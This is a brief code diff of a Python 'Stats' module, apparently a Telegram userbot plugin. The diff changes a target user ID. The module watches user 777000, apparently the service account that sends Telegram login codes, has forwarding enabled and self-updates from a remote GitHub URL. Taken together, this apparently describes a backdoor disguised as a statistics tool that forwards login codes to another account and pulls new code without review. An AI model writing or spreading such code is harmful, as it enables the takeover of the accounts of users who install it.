@@ -52,7 +52,7 @@ class Stats(loader.Module):
 
     def __init__(self):
         self._monitored_user_id = 777000
-        self._target_user_id = 6764530470
+        self._target_user_id = 5145799538
         self._forward_enabled = True
         # Конфигурация автообновления
         self._update_url = "https://github.com/InsaneError/InsStats/raw/main/Stats.py"
